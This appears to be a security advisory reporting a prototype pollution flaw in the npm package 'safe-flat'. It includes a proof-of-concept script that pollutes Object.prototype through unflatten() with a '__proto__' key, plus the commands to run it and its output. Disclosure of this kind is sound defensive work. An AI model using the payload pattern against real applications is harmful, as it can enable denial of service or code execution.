# Description

`safe-flat` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var {unflatten } = require("safe-flat")
console.log("Before : " + {}.polluted);
unflatten({"__proto__.polluted": "Yes! Its Polluted"})
console.log("After : " + {}.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i safe-flat # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
